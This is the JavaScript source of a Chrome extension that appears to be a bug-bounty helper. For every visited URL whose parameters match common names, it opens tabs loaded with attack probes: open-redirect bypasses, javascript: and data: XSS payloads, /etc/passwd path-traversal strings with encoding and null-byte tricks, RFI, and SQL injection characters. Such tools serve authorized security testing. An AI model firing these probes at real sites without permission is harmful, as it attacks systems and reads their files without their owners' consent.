/**
 * This extension casually helps testing web apps.
 *
 * Author: Github.com/M507
 */


// Always out of scope sites.
var outOfScopeList = ["chrome://newtab/", "google","undefined","stackoverflow","github","linkedin","stackexchange","medium.com","example.com","10.0.0.230","vc.mohad.red","microsoft.com","passwd","gov.sa",".gov","hackerone.com","chrome://","#DONE","AH=true"];

// Open Redirect parameters.
var openRedirectList = ["?next=","?url=","?target=","?rurl=","?dest=","?destination=","?redir=","?redirect_uri=","?redirect_url=","?redirect=","/redirect/","/cgi-bin/redirect.cgi?","/out/","/out?","?view=","/login?to=","?image_url=","?go=","?return=","?returnTo=","?return_to=","?checkout_url=","?continue=","?return_path="];
// SQL endpoint parameters.
var SQLList = ["?id=","?q=","?search=","?title="];
// possible LFI/RFI parameters.
var LFIList = ["?page="];

// Engagement scope.
// Leave it blank if u don't want to use it.
var scope = [];


chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    var togoFlag = 1;
    // IF there is a scope defined, just test that scope.

    if (changeInfo.url === undefined){
        togoFlag = 0;
    } else {

        if (changeInfo.url < 1){
            togoFlag = 0;
        }

        var x;
        for (x in outOfScopeList) {
            if (changeInfo.url.includes(outOfScopeList[x].toString())) {
                togoFlag = 0;
            }
        }

        if (outOfScopeList.includes(changeInfo.url)) {
            togoFlag = 0;
        }

    }

    if (scope.length > 1) {
        togoFlag = 0;
        var xx;
        for (xx in outOfScopeList) {
            if (changeInfo.url.includes(scope[xx].toString())) {
                togoFlag = 1;
            }}
    }

    if (togoFlag){
        openRedirectListScan(changeInfo.url);
        LFIScan(changeInfo.url);
        SQLScan(changeInfo.url);

        // Future work
        //crazyMode();
    }

});


function getDomain(url) {
    return url.split("/")[2];
}

function openURL(url) {
    url = url+"&#DONE";
    if(url!==undefined){
    chrome.tabs.create({url:url})
  }
}

function openRedirectListScan(url) {
    var x;
        for (x in openRedirectList) {
            if (url.includes(openRedirectList[x].toString())) {
                openRedirectListScanTechniques(x,url);
            }
        }
}

function openRedirectListScanTechniques(x,url) {
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"example.com&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+getDomain(url)+".example.com&";
    u2 = url.replace(part1, part2);
    openURL(u2);
    part1 = openRedirectList[x].toString()+".example.com&";
    part2 = openRedirectList[x].toString()+".example.com&"+openRedirectList[x].toString();
    u3 = u2.replace(part1, part2);
    openURL(u3);
    part1 = openRedirectList[x].toString()+getDomain(url)+".example.com&";
    part2 = openRedirectList[x].toString()+getDomain(url)+".example.com&"+openRedirectList[x].toString();
    u4 = u2.replace(part1, part2);
    openURL(u4);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"example%E3%80%82com&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+getDomain(url)+"%E3%80%82example%E3%80%82com&";
    u2 = url.replace(part1, part2);
    openURL(u2);
    // Trys
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"/\\/example.com&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"//example.com&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"Https://example.com&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"http://%67%6f%6f%67%6c%65%2e%63%6f%6d&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    // XSS from data:// wrapper
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"javascript:prompt(1)&"; //
    u1 = url.replace(part1, part2);
    openURL(u1);
    // XSS from javascript:// wrapper
    part1 = openRedirectList[x].toString();
    part2 = openRedirectList[x].toString()+"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==&";
    u2 = url.replace(part1, part2);
    openURL(u2);
}


function LFIScan(url) {
    var x;
        for (x in LFIList) {
            if (url.includes(LFIList[x].toString())) {
                LFIScanTechniques(x,url);
            }
        }
}

function LFIScanTechniques(x,url) {
    // Basic
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"../../../../../../../../../../etc/passwd&";
    u1 = url.replace(part1, part2);
    openURL(u1);
    // Basic Null byte
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"../../../../../../../../../../etc/passwd%00&";
    u2 = url.replace(part1, part2);
    openURL(u2);
    // Double encoding
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"%252e%252e%252e%252e%252e%252e%252e%252e%252fetc%252fpasswd&";
    u3 = url.replace(part1, part2);
    openURL(u3);
    // Double encoding with Null byte
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"%252e%252e%252e%252e%252e%252e%252e%252e%252fetc%252fpasswd%00&";
    u4 = url.replace(part1, part2);
    openURL(u4);
    // UTF-8 encoding
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&";
    u5 = url.replace(part1, part2);
    openURL(u5);
    // UTF-8 encoding with Null byte
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00&";
    u6 = url.replace(part1, part2);
    openURL(u6);
    // Filter bypass tricks
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"....//....//....//....//....//....//etc/passwd&";
    u7 = url.replace(part1, part2);
    openURL(u7);
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"..///////..////..//////etc/passwd&";
    u8 = url.replace(part1, part2);
    openURL(u8);
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&";
    u9 = url.replace(part1, part2);
    openURL(u9);

    // RFI
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"example.com/index.html&";
    u10 = url.replace(part1, part2);
    openURL(u10);
    part1 = LFIList[x].toString();
    part2 = LFIList[x].toString()+"example.com/index.html%00&";
    u11 = url.replace(part1, part2);
    openURL(u11);

}


function SQLScan(url) {
    var x;
        for (x in SQLList) {
            if (url.includes(SQLList[x].toString())) {
                SQLTechnique(x,url);
            }
        }
}

function SQLTechnique(x,url) {
    // Entry point detection
    var c = ["'","\"","#",";",")","*","'"];
    for (ii in c) {
        part1 = SQLList[x].toString();
        part2 = SQLList[x].toString()+c[ii].toString()+"&";
        u1 = url.replace(part1, part2);
        openURL(u1);
        }
}




////////////////////////////////////////////////////////////////////////////////////
//
// This is a new different project which needs more than just setting paramters and values.
// The reason is that we need to understand how it works, what kind of value we are facing,
// is it an email, name, id, token, or what!!!
//
////////////////////////////////////////////////////////////////////////////////////

function crazyModeGetSetOfParamters(url){
    setOfParamters = url.replace('?', '&').split("&");
    setOfParamters = setOfParamters.splice(0, 1); // At index 0 remove one
    return setOfParamters
}

function crazyMode(url) {
    setOfParamters = crazyModeGetSetOfParamters(url); // ["id=1","name=kaka","parameter=value"]
    for (i in setOfParamters) {
        set = setOfParamters[i].split("=");
        parameter = set[0];
        value = set[1];
    }
}
